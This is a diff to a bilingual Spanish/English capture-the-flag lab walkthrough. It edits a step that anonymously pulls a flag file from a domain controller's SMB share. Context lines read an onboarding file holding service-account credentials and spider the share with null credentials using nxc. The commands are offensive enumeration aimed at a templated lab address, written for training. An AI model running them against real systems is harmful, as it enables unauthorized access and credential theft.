@@ -55,7 +55,8 @@ smb: \&gt; exit
 cat flag-ad-01.txt          # ← flag del laboratorio
 cat IT_Onboarding.txt   # ← credenciales de svc.readonly</pre>
     <p>O en una sola línea, sin sesión interactiva:</p>
-    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get flag-ad-01.txt -' 2&gt;/dev/null
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get flag-ad-01.txt' 2&gt;/dev/null
+cat flag-ad-01.txt
 nxc smb {{ ad_dc_ip }} -u '' -p '' --spider public --regex .</pre>
 
     <h3>4 · Capturar la flag</h3>
@@ -111,7 +112,8 @@ smb: \&gt; exit
 cat flag-ad-01.txt          # ← lab flag
 cat IT_Onboarding.txt   # ← svc.readonly credentials</pre>
     <p>Or as a one-liner, no interactive session:</p>
-    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get flag-ad-01.txt -' 2&gt;/dev/null
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get flag-ad-01.txt' 2&gt;/dev/null
+cat flag-ad-01.txt
 nxc smb {{ ad_dc_ip }} -u '' -p '' --spider public --regex .</pre>
 
     <h3>4 · Capture the flag</h3>
